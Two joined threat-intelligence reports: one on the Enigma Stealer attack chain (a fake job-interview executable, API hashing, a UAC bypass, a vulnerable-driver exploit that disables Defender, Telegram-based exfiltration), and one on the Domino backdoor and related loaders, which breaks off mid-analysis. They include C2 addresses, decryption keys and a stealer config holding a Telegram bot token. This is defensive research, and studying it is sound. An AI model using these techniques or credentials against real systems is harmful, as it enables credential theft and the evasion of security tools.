This file, which also masquerades as a legitimate word document, is designed to lure unsuspecting victims into executing the loader.
Once executed, the Enigma loader begins the registration and downloading of the second-stage payload. 
Analysis of the Enigma infrastructure Enigma uses two servers in its operation.
The first utilizes Telegram for delivering payloads, sending commands, and receiving the payload heartbeat.
The second server 193[.]56[.]146[.]29 is used for DevOps and logging purposes.
At each stage the payload sends its execution log to the logging server.
Since this malware is under continuous development the attacker potentially uses the logging server to improve malware performance.
We have also identified the Amadey C2 panel on 193[.]56[.]146[.]29 which has only one sample (95b4de74daadf79f0e0eef7735ce80bc) communicating with it. Figure 4.
Amadey C&C login page Amadey is a popular botnet that is sold on Russian speaking forums, but its source code has been leaked online.
Amadey offers threat actors polling and reconnaissance services. 
Figure 5.
The exposed info.php page of the threat actors’ command-and-control (C&C) infrastructure 
This server has a unique Linux distribution only referenced in Russian Linux forums. 
Figure 6.
The default time zone of the C&C server The default time zone on this server is set to Europe/Moscow.
This server registers a newly infected host when Interview conditions.word.exe is executed by the victim. 
Stage 1: EnigmaDownloader_s001 MD5 SHA-1 SHA-256 File size 1693D0A858B8FF3B83852C185880E459 5F1536F573D9BFEF21A4E15273B5A9852D3D81F1 03B9D7296B01E8F3FB3D12C4D80FE8A1BB0AB2FD76F33C5CE11B40729B75FB23 367.00 KB (375808 bytes) 
The initial stage of Enigma, Interview conditions.word.exe, is a downloader written in C++.
Its primary objective is to download, deobfuscate, decompress, and launch the secondary stage payload.
The malware incorporates multiple tactics to avoid detection and complicate reverse engineering, such as API hashing, string encryption, and irrelevant code. 
Before delving into the analysis of "EngimaDownloader_s001," let's first examine how the malware decrypts strings and resolves hashed Windows APIs.
By understanding this, we can implement an automated system to help us retrieve encrypted data and streamline the analysis process.
Please be advised that to enhance code legibility, we have substituted all hashes with the corresponding function names. 
EngimaDownloader_s001 API Hashing: API hashing is a technique employed by malware to conceal the utilization of potentially suspicious APIs (functions) from static detection.
This technique helps the malware disguise its activities and evade detection. 
It involves replacing the human-readable names of functions (such as "CreateMutexW") with a hash value, such as 0x0FD43765A.
The hash value is then used in the code to call the corresponding API function, rather than using the human-readable name.
The purpose of this technique is to make the process of understanding the code more time-consuming and difficult. 
For API Hashing the EnigmaDownloader_s001 uses the following custom MurmurHash: Figure 7.
Custom implementation of murmur hash The malware employs dynamic API resolving to conceal its API imports and make static analysis more difficult.
This technique involves storing the names or hashes of the APIs needed, then importing them dynamically at runtime. 
The Windows API offers LoadLibrary and GetProcAddress functions to facilitate this.
LoadLibrary accepts the name of a DLL and returns a handle, which is then passed to GetProcAddress along with a function name to obtain a pointer to that function.
To further evade detection, the malware author even implemented their own custom version of GetProcAddress to retrieve the address of functions such as LoadLibrary and others.
The use of standard methods like GetProcAddress and LoadLibrary might raise a red flag, so the custom implementation helps to avoid detection. 
Figure 8.
Dynamic API loading The following is a list of API hash values along with the names of functions that have been used in this sample (Please note that the hash value might be different in other variants since the malware author changed some of the constant values in the hash generator function). 
0xE04A219 : kernel32_HeapCreate 0xA1ADA36 : kernel32_lstrcpyA 0x5097BB4 : kernel32_RegOpenKeyExA 0x750EFAB : kernel32_GetLastError 0x4CB039A : kernel32_RegQueryValueExA 0xAAF4498 :
kernel32_RegCloseKey 0xFAD2A34 : kernel32_lstrcmpiA 
0x11A198F : combase_CoCreateGuid 0xE94A809 : kernel32_RtlZeroMemory 0x6A6A154 : kernel32_lstrcatA 0x8150471 : ntdll_RtlAllocateHeap 0x4CF4539 : user32_wvsprintfW 0x663555F : kernel32_WideCharToMultiByte 0x59CADCE :
ntdll_RtlFreeHeap 0x1CE543C : cabinet_CloseDecompressor 0x11CF0A2 : wininet_InternetGetConnectedState 0x675C7B2 : kernel32_Sleep 0xDC75FF2 : wininet_InternetCheckConnectionA 0x5CC35B1 : wininet_InternetSetOptionA 0xF9E8859 : wininet_InternetOpenA 0x6F05A9E : wininet_InternetConnectA 0xBAEECD9 :
wininet_HttpOpenRequestA 0xAD9A77C : wininet_HttpSendRequestA 0x835FA71 : wininet_HttpQueryInfoA 0xBFA9532 : wininet_InternetReadFile 0x99D029C : wininet_InternetCloseHandle 0x8DABD38 : kernel32_GetFileAttributesW 0x44E1C18 : kernel32_DeleteFileW 0xAB69596 : kernel32_CreateFileW 0x2CF38A1 :
kernel32_WriteFile 0x1CE43DE : kernel32_CloseHandle 0x548C5A4 : Rpcrt4_RpcStringBindingComposeW 0x7B0F79F : Rpcrt4_RpcBindingFromStringBindingW 0x69A2B62 :
Rpcrt4_RpcStringFreeW 0xD2CD112 : advapi32_CreateWellKnownSid 0xEFBC2E9 : kernel32_LocalFree 0x60EDB01 : Rpcrt4_RpcBindingFree 0x7A7DAA0 : Rpcrt4_RpcAsyncInitializeHandle 0xB3F16FA : kernel32_CreateEventW 0x1C23B4F : Rpcrt4_NdrAsyncClientCall 0x8C1F37 : kernel32_WaitForSingleObject 0x7831640 : Rpcrt4_RpcRaiseException 0xF2FCCFE : Rpcrt4_RpcAsyncCompleteCall 0x816F545 : kernel32_SetLastError 0xFBE2D99 : oleaut32_SysAllocString 0x393ACB : oleaut32_SysFreeString 0xC9FEF5F : kernel32_ExpandEnvironmentStringsW 0x74D51D3 : kernel32_CreateProcessW 0xCDE9EC27 : wininet_HttpWebSocketClose 0x80C8449 : kernel32_TerminateProcess 0x418B4E7E : wininet_AppCacheCheckManifest 0x44E65EB : kernel32_WaitForDebugEvent 0x81C3F46 :
kernel32_ContinueDebugEvent 0x1FB9EB2 : kernel32_LoadLibraryW 0x1071970 : kernel32_GetProcAddress 0xDAE6C9B : combase_CoInitializeEx 0xFD43765 : kernel32_CreateMutexW 0x73861029 : kernel32_BasepSetFileEncryptionCompression 0xA3FE987 : advapi32_RegDeleteKeyW 0x1CA6703 : advapi32_RegCreateKeyA 0x24EBD39 : kernel32_lstrlenA 0x69F38C6 :
kernel32_RegSetValueExA 0xC2D33DC : ntdll_RtlGetVersion 0xBD5D03A : kernel32_GetNativeSystemInfo 0x10BEDD60 : wininet_CreateMD5SSOHash To resolve the API hash, the malware first passes two arguments to the "mw_resolveAPI" function.
The first argument is the specific library name index number (in this case 0xA = Kernel32.dll), while the second argument is the export function name hashed value (which, in this example, is 0xFD43765A) 
The mw_resolveAPI function first finds the specific index, jumps to it, and decrypts the corresponding library name value as shown in the bottom image of Figure 9. Figure 9.
Resolving API hashes The following is the list of decrypted library names: 
WinInet.dll userenv.dll psapi.dll netapi32.dll mpr.dll wtsapi32.dll api-ms-win-core-processthreads-l1-1-0.dll ntoskrnl.exe Rpcrt4.dll User32.dll api-ms-win-core-com-l1-1-0.dll Cabinet.dll shell32.dll OleAut32.dll Ole32.dll ntdll.dll mscoree.dll kernel32.dll advapi32.dll The library name and export function name hashed value is then passed to GetExportAddressByHash, which is responsible for opening the handle to the library, creating a hash for each export function name, and comparing it with the passed argument.
Once the match is found, the malware returns the function address and calls it. Figure 10.
Retrieving the address of an API The code snippet in Figure 11 demonstrates how mw_GetExportAddressByHash resolves the given API hash and retrieves the address of an exported function.
The techniques used to decrypt strings and resolve API hashes in both the stage 1 and stage 2 payloads are identical. 
Figure 11.
Custom implementation of GetProcAddress With an understanding of this process, we can then proceed with our analysis. 
Upon execution, the malware creates the mutual exclusion object (mutex) to mark its presence in the system and retrieves the MachineGuid of the infected system from the SOFTWARE\Microsoft\Cryptography\MachineGuid registry key, which it uses as a unique identifier to register the system with its C&C server and track its infection. 
Figure 12.
Constructing a unique system identifier and creating a mutex It then deletes the HKCU\SOFTWARE\Intel registry key and recreates it with two values, HWID and ID, as shown in Figure 13. Figure 13.
Recreating HKCU\SOFTWARE\Inte It then collects information about the .NET Framework Setup on the infected system and sends it to its C&C server as shown in Figure 14. Figure 14.
Constructing first debug message Figure 15.
An example of the first debug message There are two C&C servers that were used in this attack chain.
The first one ,193[.]56[.]146[.]29, is used to send program execution DEBUG and Telegram to deliver payloads and send commands. 
To download the next stage payload, the malware first sends a request to the attacker-controlled Telegram channel https://api[.]telegram[.]org/bot{token}/getFile to obtain the file_path.
This approach allows the attacker to continuously update and eliminates reliance on fixed file names. 
Figure 16.
Payload “file_path” request from Telegram Note that in this case, the next stage payload was file_17.pack.
However, this file and other stage names were changed multiple times during our investigation. 
Upon obtaining the file_path, the malware then sends a request to download the next stage binary file (shown in Figure 17) Figure 17.
Payload download request from Telegram Figure 18.
The code responsible for decrypting the next stage payload file_id and Telegram token If the file's download, deobfuscation, and decompression are successful, the malware sends the message "bot getted" to the debug server. Figure 19.
Successful payload retrieval debug message To decompress the payload, the malware uses Microsoft Cabinet's Compressapi with the compression algorithm ("COMPRESS_RAW | COMPRESS_ALGORITHM_LZMS").
The code snippet in Figure 20 demonstrates how the malware downloads, deobfuscates, and decompresses file_17.pack (UpdateTask.dll). 
Figure 20.
Code responsible for downloading, deobfuscating, decompressing, and renaming the downloaded payload Figure 21.
Payload deobfuscation and decompression Before executing the payload, the malware attempts to elevate its privileges by executing the mw_UAC_bypass function, which is part of an open-source project.
This technique, Calling Local Windows RPC Servers from .NET (which was unveiled in 2019 by Project Zero), allows a user to bypass user account control (UAC) using only two remote procedure call (RPC) requests instead of DLL hijacking. 
Figure 22.
Successful UAC bypass execution debug message 
The malware requires elevated privileges for the subsequent stage payload, which involves loading the malicious driver by exploiting CVE-2015-2291. 
Finally, the malware executes an export function called "Entry" from UpdateTask.dll via rundll32.exe as shown in Figure 23. Figure 23.
Running the stage 2 payload through rundll32.exe Stage 2: EngimaDownloader_s002 MD5 SHA-1 SHA-256 File size 377f617ccd4aa09287d5221d5d8e1228 288358deaa053b30596100c9841a7d6d1616908d f1623c2f7c00affa3985cf7b9cdf25e39320700fa9d69f9f9426f03054b4b712 497.50 KB (509440 bytes) 
The second stage payload, UpdatTask.dll, is a dynamic-link library (DLL) written in C++ that comprises two export functions (DllEntryPoint and Entry).
The malicious code is executed in the Entry export function, which is triggered by the first stage routine.
The primary objective of this malware is to disable Microsoft Defender by deploying a malicious kernel mode driver (“bring your own vulnerable driver” or BYOVD method) via exploiting a vulnerable Intel driver (CVE-2015-2291) and then downloading and executing the third-stage payload. 
Please note that the first, second, and third-stage payloads all obtain the infected system's MachineGuid at the start and use it to identify the machine in debug message network traffic, enabling the adversary to track the infected system's malware execution state. 
Upon execution, the malware creates the mutex to mark its presence on the system and retrieves the MachineGuid of the infected system from the "SOFTWARE\Microsoft\Cryptography\MachineGuid" registry key. 
Figure 24.
Constructing a unique system identifier and creating a mutex Next, the malware will determine if it is running as an account with administrator privileges or simply as a regular user using the GetTokenInformation API.
If the malware fails to obtain elevated privileges, it will bypass the disablement of Windows Defender and proceed to download and execute the next stage of its attack. 
Figure 25.
Checking the process privileges If the process successfully obtains elevated privileges, it proceeds to drop the files shown in Figure 26. Figure 26.
Stage 2 embedded binary files Name MD5 SHA-1 SHA-256 iQVW64.SYS (CVE-2015-2291) Vulnerable Intel driver, used for kernel exploitation 1898ceda3247213c084f43637ef163b3 d04e5db5b6c848a29732bfd52029001f23c3da75 4429f32db1cc70567919d7d47b844a91cf1329a6cd116f582305f3b7b60cd60b Driver.
SYS Malicious drivers reduce the token integrity of Microsoft defender (MsMpEng.exe) 28ca7a21de60671f3b528a9e08a44e1c 21F1CFD310633863BABAAFE7E5E892AE311B42F6 D5B4C2C95D9610623E681301869B1643E4E2BF0ADCA42EAC5D4D773B024FA442 The malware uses an open-source project called KDMapper to manually map non-signed/self-signed drivers in memory by exploiting the iqvw64e.sys Intel driver.
Testing on this has reportedly been conducted on Windows 10 version 1607 to Windows 11 version 22449.1.
The functions intel_driver::Load() and kdmapper::MapDriver() are both responsible for achieving this task. 
The following snippet demonstrates the debug message related to drive loading and installation: Figure 27.
Debug message for loading the driver and providing execution status 
The malware then establishes persistence on the targeted system by creating scheduled tasks. Figure 28.
Malware persistence is achieved via scheduled tasks (click the image for a larger version) 
Finally, the EngimaDownloader_s002 downloads and executes the next-stage payload on the infected system.
To achieve this task, it employs similar techniques as those used in the first stage — the only difference, in this case, is that the malware is executing a .NET Assembly from C++ in memory using the CLR (Common Language Runtime) hosting technique. 
Figure 29.
The stage 3 .NET binary is executed via CLR hosting Stage 2.1: Engima Driver analysis Name MD5 SHA-1 SHA-256 Driver.
SYS 28ca7a21de60671f3b528a9e08a44e1c 21F1CFD310633863BABAAFE7E5E892AE311B42F6 D5B4C2C95D9610623E681301869B1643E4E2BF0ADCA42EAC5D4D773B024FA442 The driver's sole purpose is to patch the integrity level of the Microsoft defender (MsMpEng.exe) and forcibly reduce it from system to untrusted integrity.
The reduction of the integrity level to untrusted impedes the process of accessing secure resources on the system for the victim, silently disabling it without terminating the process. 
Figure 30.
Microsoft defender token integrity modification before and after executing Enigma Driver The code snippets in Figure 31 demonstrate how the malware performs these operations. 
Figure 31.
Integrity level patching Figure 32.
Details of the vulnerable Intel driver binary Figure 33.
Details of the certificate of the vulnerable driver (top) and Enigma Driver (bottom) Stage 3: EngimaDownloader_s003 The following table shows the details of Enigma.Bot.Net.exe. 
MD5 SHA-1 SHA-256 File size 50949ad2b39796411a4c7a88df0696c8 67a502395fc4193721c2cfc39e31be11e124e02c 8dc192914e55cf9f90841098ab0349dbe31825996de99237f35a1aab6d7905bb 10.50 KB (10752 bytes) EngimaDownloader_s003 is a third-stage downloader written in C#.
It is responsible for downloading, decompressing, and executing the final stealer payload on an infected system.
The malware also accepts commands from a Telegram channel, though these commands may vary between variants. 
stop alive runassembly Upon launch, the malware sends a "Bot started" message to both the Debug server and the Telegram channel, indicating its successful execution. Figure 34.
Stage 3 payload initialization 
It then sends a GET request to https://api[.]telegram[.]org/bot{token}/getUpdates to retrieve the command.
Upon receiving the runassembly command, the malware downloads the next part of the final stage payload (file_19.pack), decompresses it using the GZipStream API, and executes it. 
Figure 35.
Stage 3 payload commands Figure 36.
An example of network communication between EngimaDownloader_s003 and the attacker’s Telegram channel. 
Stage 4: Enigma Stealer MD5 SHA-1 SHA-256 File size 4DC2D57D9DB430235B21D7FB735ADF36 98BF3080A85743AB933511D402E94D1BCEE0C545 4D2FB518C9E23C5C70E70095BA3B63580CAFC4B03F7E6DCE2931C54895F13B2C 2954.75 KB (2954752 bytes) 
The final stage is the Enigma Stealer which, as we previously mentioned, is a modified version of an open-source information stealer project called Stealerium. 
Upon execution, the malware initializes configuration and sets up its working directory. Figure 37.
Engima Stealer initialization The malware configuration is as follows: public static string Version = "0.05.01"; public static string DebugMode = "0"; public static string Mutex = "6C0560CE-2E75-4BB4-A26E-F08592A1D56D"; public static string AntiAnalysis = "0"; public static string Autorun = "1"; public static string StartDelay = "0"; public static string WebcamScreenshot = "1"; public static string KeyloggerModule = "0"; public static string ClipperModule = "0"; public static string GrabberModule = "0"; public static string TelegramToken = "5894962737:AAHAFZnz2AkLAyHC0G-7S2je9JMWWLJHGsU"; public static string TelegramChatID = "5661436914"; It then starts to collect system information and steals user information, tokens, and passwords from various web browsers and applications such as Google Chrome, Microsoft Edge, Microsoft Outlook, Telegram, Signal, OpenVPN and others.
It captures screenshots and extracts clipboard content and VPN configurations. 
Figure 38.
Enigma Stealer exfiltrating sensitive data 
The collected information is then compressed and exfiltrated to the attacker via Telegram. 
Figure 39.
An example of data exfiltrated from the victim’s system Figure 40.
Data upload logic Figure 41 illustrates a sample of the network traffic generated by the malware. 
Figure 41.
Network traffic of data upload to the attacker's telegram channel Figure 42.
Enigma Stealer capabilities It's worth mentioning that some strings, such as web browser paths and Geolocation API services URLs, are encrypted with the AES algorithm in cipher-block chaining (CBC) mode. 
Figure 43.
String encryption logic List of decrypted strings: \Chromium\User Data\ \Google\Chrome\User Data\ \Google(x86)\Chrome\User Data\ \Opera Software\ \MapleStudio\ChromePlus\User Data\ \Iridium\User Data\ 7Star\7Star\User Data //CentBrowser\User
Data //Chedot\User
Data Vivaldi\User Data Kometa\User Data Elements Browser\User Data Epic Privacy Browser\User Data uCozMedia\Uran\User Data Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer CatalinaGroup\Citrio\User
Data Coowon\Coowon\User Data liebao\User Data QIP Surf\User
Data Orbitum\User Data Comodo\Dragon\User Data Amigo\User\User Data Torch\User Data Yandex\YandexBrowser\User Data Comodo\User Data 360Browser\Browser\User Data Maxthon3\User Data K-Melon\User Data CocCoc\Browser\User Data BraveSoftware\Brave-Browser\User Data Microsoft\Edge\User Data http://ip-api.com/line/?fields=hosting https://api.mylnikov.org/geolocation/wifi?v=1.1&bssid= https://discordapp.com/api/v6/users/@me Conclusion Similar to previous campaigns involving groups such as Lazarus, this campaign demonstrates a persistent and lucrative attack vector for various advanced persistent threat (APT) groups and threat actors.
Through the use of employment lures, these actors can target individuals and organizations across the cryptocurrency and Web 3 sphere.
Furthermore, this case highlights the evolving nature of modular malware that employ highly obfuscated and evasive techniques along with the utilization of continuous integration and continuous delivery (CI/CD) principles for continuous malware development. 
Organizations can protect themselves by remaining vigilant against phishing attacks.
Furthermore, individuals are advised to remain cautious of social media posts or phishing attempts that offer job opportunities unless they are sure of their legitimacy.
Due to current economic conditions, threat actors can be expected to continue to heavily deploy employment lures to target those seeking employment. 
Meanwhile, organizations should also consider cutting edge multilayered defensive strategy and comprehensive security solutions such as Trend Micro:trade_mark: XDR that can detect, scan, and block malicious URLs across the modern threat landscape. Indicators of Compromise (IOCs) 
The indicators of compromise for this entry can be found here. 
Authors Aliakbar Zahravi Staff Researcher Peter Girnus Sr. Threat Researcher 
title: Ex-Conti and FIN7 Actors Collaborate with New Domino Backdoor url: https://securityintelligence.com/posts/ex-conti-fin7-actors-collaborate-new-backdoor/ This blog was made possible through contributions from Christopher Caridi. 
IBM Security X-Force recently discovered a new malware family we have called “Domino,” which we assess was created by developers associated with the cybercriminal group that X-Force tracks as ITG14, also known as FIN7.
Former members of the Trickbot/Conti syndicate which X-Force tracks as ITG23 have been using Domino since at least late February 2023 to deliver either the Project Nemesis information stealer or more capable backdoors such as Cobalt Strike. 
Background This discovery highlights the intricate nature of cooperation among cybercriminal groups and their members: Since late February 2023, Domino Backdoor campaigns have been observed using the Dave Loader, which we have linked to the Trickbot/Conti syndicate and its former members. 
Domino’s code shows overlap with the Lizar (aka Tirion, Diceloader) malware family, leading us to suspect that it was created by current or former ITG14 developers. 
One of Domino’s final payloads is the Project Nemesis infostealer.
Project Nemesis was first advertised on the dark web in December 2021, though has been rarely used since then. 
Analysis Ex-Conti Members Deploy Domino in Recent Campaigns Former members of ITG23 (aka the Trickbot/Conti syndicate) are likely behind recent campaigns using the Dave Loader to load Domino Backdoor and probably collaborated with current or former ITG14 developers to purchase or use the new malware family.
X-Force previously assessed that Dave is one of several loaders or crypters developed by members of the Trickbot/Conti group.
Although the group has fractured, many of its loaders/crypters — including Dave — have been maintained and continue to be used by factions composed of former Trickbot/Conti members, including Quantum, Royal, BlackBasta, and Zeon. 
The Dave Loader has been used recently with several Cobalt Strike samples with the watermark “206546002,” which X-Force and other security researchers — here and here — have associated with groups composed of former members of the Trickbot/Conti syndicate, including Quantum and Royal.
X-Force observed Dave-loaded Cobalt Strike samples using this watermark in suspected Royal attacks in fall 2022. 
Dave Loader has also been used this year to load IcedID and Emotet, both of which serve as initial access vectors for ransomware attacks from former Trickbot/Conti-affiliated factions. 
Recently observed Dave samples were discovered loading a new malware, which we have named Domino Backdoor.
This new backdoor gathers basic system information, which it then sends to the C2, and in return receives an AES encrypted payload. 
In most instances, the received payload was a second loader that was found to have code overlap with Domino Backdoor, and as such we have dubbed it Domino Loader.
This loader contains an encrypted payload within its resources, which it decrypts using AES.
The decrypted payload is a .NET infostealer, which identifies itself as ‘Nemesis Project.’ 
The Domino Backdoor is designed to contact a different C2 address for domain-joined systems, suggesting a more capable backdoor, such as Cobalt Strike, will be downloaded on higher value targets instead of Project Nemesis. 
Domino’s Connections to ITG14 Analysis revealed that both the Domino Backdoor and Loader share code overlap with the Lizar Malware, also known as Tirion and DiceLoader, which is attributed to the threat group ITG14 (FIN7).
In addition to having similar coding styles and functionality, both Domino and DiceLoader share the same configuration structure and have similar bot ID formats.
Lizar was reportedly first used in March 2020, when it was originally named Tirion, and has been observed in numerous ITG14 campaigns up to the end of 2022.
Domino has been active in the wild since at least October 2022, which notably is when Lizar observations began to decrease. 
X-Force researchers found additional evidence connecting Domino Backdoor to ITG14’s Carbanak Backdoor.
We identified Domino Backdoor samples from December 2022, which used a different loader that we have dubbed NewWorldOrder Loader.
The samples used the name ThunderboltService.exe and downloaded and loaded the Project Nemesis Stealer. 
Around the same time, we also uncovered NewWorldOrder Loader samples, with the same filename ThunderboltService.exe, used to load the Carbanak Backdoor.
Carbanak has been used by ITG14 since late 2015. 
Finally, X-Force analysts also observed that two of the Domino Backdoor C2 addresses belonging to MivoCloud: 94.158.247[.]72 and 185.225.17[.]202 are very close to C2 addresses ITG14 has used previously for SSH-based Backdoors such as 94.158.247[.]23 and 185.225.17[.]220.
While such overlap is insufficient for attribution, it is nonetheless consistent with other evidence linking Domino to an ITG14 developer and may indicate the latter’s preference for MivoCloud for at least some of their C2 addresses.
MivoCloud has also been used to host Diceloader and Carbanak C2 servers. 
Collaboration between members of ITG14 and former members of ITG23 is not without precedent.
Other researchers — here and here — observed ITG14 attacks using Ryuk ransomware in 2020, which has been attributed to the Trickbot/Conti cybercrime syndicate, while others have also identified connections between a FIN7 developer and tools used by the BlackBasta group, whose members also have ties to the former Trickbot/Conti syndicate. 
Project Nemesis The Project Nemesis infostealer has been active in the wild since December 2021, when it was offered for sale on several Dark Web forums.
It can collect data from a range of web browsers, as well as applications including Steam, Telegram, Discord, crypto wallets, and VPN providers. 
Domino has been used to install Project Nemesis since at least October 2022 — prior to its use in late February 2023 by ex-Conti actors.
This leads us to assess that the ITG14 members responsible for developing Domino probably had a relationship with Project Nemesis and offered Domino and the infostealer to the ex-Conti threat actors as a package.
The ex-Conti members in turn likely used the Project Nemesis infostealer against lower value targets. 
The use of infostealers by former Trickbot/Conti members and their distributors is not without precedent — other security researchers observed the Vidar infostealer delivered during DEV-0569 Batloader campaigns that also led in some cases to Cobalt Strike and Royal ransomware.
We assess that infostealers may often be deployed during lower priority infections, e.g., on personal computers or those not belonging to an Active Directory domain, while higher priority infections receive other backdoors such as Cobalt Strike. 
Malware Deep Dive This section contains a deeper look at the Dave Loader, Domino Backdoor, Domino Loader, and Project Nemesis Infostealer malware. 
Dave Loader The sample analysed for the purpose of this report is a 64-bit executable with MD5 hash 2CC79806701F1A6E877C29B93F06F1BB and a reported compile date of 28 February 2023.
This sample is identified as a variant of Dave Loader, a crypter linked to threat group ITG23 and more commonly observed with payloads such as Emotet. 
This sample has two encrypted resources within a resource directory named “XKLKLCRTE.”
Dave Loader loads the resources using the API calls LdrFindResource_U and LdrAccessResource, and decrypts them using XOR and the key mh8ZqMlTsaDYBZe7ma\x00. 
The smaller payload, with resource ID 3412, is a shellcode blob that contains code designed to load a PE file.
The second payload, with resource ID 6732, is a PE file.
Dave Loader executes the decrypted shellcode and passes the PE payload to it, which the shellcode then loads and executes. 
Domino Backdoor The loaded payload is a 64-bit DLL written in Visual C++, with MD5 hash CDBE0FEB82B1CAF164C7DA42CB9A20BE.
The payload was found to be a hitherto unknown backdoor, which will be referred to as Domino Backdoor. 
Upon execution, Domino Backdoor starts by generating a Bot ID for the infected system by gathering the username and hostname and creating a hash of the collected data, to which it then appends its current process id.
For example, a648628c13d928dc-4480.
This bot ID format is similar to that generated by Lizar, which also used a checksum of system information, combined with the process ID.
However, Lizar used a CRC algorithm to create its hash, whereas Domino uses a custom algorithm which XOR’s multiple values together.
Interestingly, Lizar used a similar XOR-based algorithm as part of its encryption mechanisms during communication with the C2. Fig 1 — Domino Backdoor system ID generation The malware then proceeds to decrypt its configuration block, which is stored in the data section of the binary.
The config is decrypted using XOR and a 16-byte key which is stored immediately before the encrypted config block.
In this case the key is {03 9B 54 72 17 D3 5E E6 E0 E9 EF E0 DF 36 0D 79}. 
Fig 2 — Domino Backdoor config decryption In the analysed sample the decrypted config contains two pipe-delimited IP addresses, 88.119.175[.]124 and 94.158.247[.]72.
This is the same format used by Lizar to store its configuration. 00000000 38 38 2e 31 31 39 2e 31 37 35 2e 31 32 34 7c 39 |88.119.175.124|9| 00000010 34 2e 31 35 38 2e 32 34 37 2e 37 32 00 6e ee 99 |4.158.247.72.nî.| 00000020 37 b1 2d 84 e5 8d 6a 70 21 3e d5 21 2c c1 37 b5 |7±-.å.jp!>Õ!,Á7µ| 00000030 1f b7 09 f3 9b 0a c7 fe 53 32 23 6a 8c b0 4e 22 |.·.ó..ÇþS2#j.°N”| Scroll to view full table 
A second config block, which is decrypted separately, contains an RSA public key. 
The malware generates a random 32-byte key, which it encrypts using the RSA key.
It then attempts to connect to the C2 via TCP port 443 and send the encrypted key.
Prior to the C2 connection, the malware checks whether the host system is connected to a domain.
If the system is detected as being domain joined, then the malware uses the second IP address from the config to connect to the C2, otherwise, it defaults to the first. 
If the initial connection is successful, the malware then proceeds to gather basic system information, including username, computer name, and OS version, which it then encrypts using AES-256-CBC and the generated, shared key (null bytes used for IV). 
An example of the unencrypted data structure, which the malware sends to the C2, can be seen below. 00000000 39 00 00 00 0b 15 61 36 34 38 36 32 38 63 31 33 |9…..
a648628c13| 00000010 64 39 32 38 64 63 2d 34 34 38 30 03 01 0a 00 00 |d928dc-4480…..| 00000020 00
5a 29 00 00 0c 32 39 46 65 58 73 6b 64 70 4c |.Z)…29FeXskdpL| 00000030 59 67 0a 76 6e 50 78 53 46 65 6f 4e 4e |Yg.vnPxSFeoNN| Scroll to view full table 
This structure breaks down as follows: Offset Size (bytes) Contents Description 0x0 4 0x00000039 Size of structure 0x4 1 0x0B Hardcoded value 0xB (11) 0x5 1 0x15 Size of system id string 0x6 21 a648628c13d928dc-4480 System ID string 0x1B 1 0x03 Value indicating presence of domain string 0x1C 1 0x01 Unknown 0x1D 1 0x0A OS Major version (10) 0x1E 1 0x00 OS Minor version 0x1F 
2 0x0000 Unknown 0x21 4 0x5a290000 OS Build Number (0x295A = 10586) 0x25 1 0x0C Size of computer name string 0x26 12 29FeXskdpL Computer Name 0x32 1 0x0A Size of username string 0x33 10 vnPxSFeoNN Username Scroll to view full table 
The malware first sends 4 bytes to the C2 that contain a XOR-encrypted value, which is the size of the data to follow, and then sends the AES-encrypted system data. 
The malware then begins a loop of checking in with the C2 by first sending a 4-byte encrypted size, followed by a 16-byte AES-encrypted block, which decrypts to the following 5 bytes {01 00 00 00 ff}.
It continues this every second until it receives a response from the C2. 
When it receives a response, the malware expects the C2 to send 4 bytes containing the payload size, followed by the payload itself.
The malware then decrypts the received payload using AES and the shared key. 
The decrypted data consists of a 4 byte size, followed by a single byte indicating either a command or the load method that the malware should use for the payload, followed by the payload data itself, if applicable. 
If the command byte is 0x3, then the malware exits. 
If the command byte is 0x7, then the malware enumerates the running processes on the system and compiles a list of process names and IDs.
This data is then encrypted using AES and returned to the C2. 
Otherwise, the malware proceeds to load and execute the received payload using the method indicated by the load/command byte.
The following methods are supported: 
0x1 — Copy the payload into allocated memory within the current process and create a new thread to execute an export named ReflectiveLoader within the payload DLL. 0x4 — Save the payload to the %Temp% directory with a filename generated via GetTempFileNameA, and execute the file using CreateProcessA. 0x5, 0x6 — Open process with process id provided with the downloaded data.
Allocate space within the process and write the payload data to the process memory.
Then create a new thread in the remote process to execute an export named ReflectiveLoader within the copied payload DLL.
This method is likely intended to be used following command 0x7. 
In the case of the analysed sample, the received payload contained a DLL binary, and command 0x1 was specified. 
Fig 3 — Domino Backdoor command structure Overlap with Lizar Toolkit Domino Backdoor shares a lot of overlap with malware associated with the Lizar Toolkit, which is attributed to threat group ITG14.
The Lizar Toolkit consists of a backdoor/loader, a collection of modules/plugins which can be executed by the loader, and C2 client and server applications.
A detailed report on the Lizar Toolkit can be found here. 
In addition to having similar coding styles and utilising similar API calls, Domino Backdoor uses the same configuration structure as the Lizar Loader.
In both cases, a configuration block containing a pipe-delimited list of IP addresses is decrypted using XOR and a 16-byte key which is stored immediately before the encrypted config. 
Both malware families also generate system IDs in very similar manners.
In the case of Domino Backdoor a hash is generated from the system username and hostname and the process ID is appended.
The hashing algorithm is custom and appears to be based on an encryption algorithm used previously in the Lizar Loader. 
Lizar Loader also generates a system ID which consists of a hash of system data followed by the current process ID, however, it uses a CRC algorithm to create its hash. 
Domino Backdoor also incorporates elements that appear in some of Lizar’s plugins.
For example, the system information gathered by Domino Backdoor and sent to the C2 matches the reported functionality of Lizar’s Info32/Info64.dll plugin.
Also, the function within Domino Backdoor to enumerate running processes and send a list of process names and IDs back to the C2 is very similar to the functionality of Lizar’s ListProcesses32/ListProcesses64.dll plugin. 
Finally, Lizar’s Jumper32/Jumper64.dll plugin resembles the code within Domino Backdoor, which is able to load a payload using several different methods, with the required one specified using a command ID number. 
Domino Loader The payload received by the Domino backdoor from the C2 during this analysis was a 64-bit DLL, written in C++, with MD5 hash 2373BE26018075847AEA51636B739F66 and an internal filename of MultiRunDll64.dll.
The payload was found to be a Loader with similarities to Domino Backdoor, and will be referred to as Domino Loader. 
Domino Loader has one export named ReflectiveLoader that contains code taken from the well-known ReflectiveDLLInjection project.
When run, this code performs the steps needed to properly load the DLL into memory, and allows for DLL payloads to load themselves directly from memory into a host process. 
Once loaded, Domino Loader starts by loading an encrypted payload from its resources and decrypting it using AES-256-CBC and a hardcoded key.
The Microsoft WinCrypt library is used for AES encryption and decryption by both Domino Backdoor and Loader. 
The decrypted data consists of 4 bytes containing the payload size, followed by a further 4 bytes containing either the entry point offset for the payload or a value indicating the load method which should be used, followed by the payload itself. 
If the entry point/load field contains a positive value, then the loader allocates memory within the current process space, copies the payload data to it, and then executes it at the specified offset indicated by the field value.
This option is most likely used for shellcode payloads or further DLLs with ReflectiveLoader exports. 
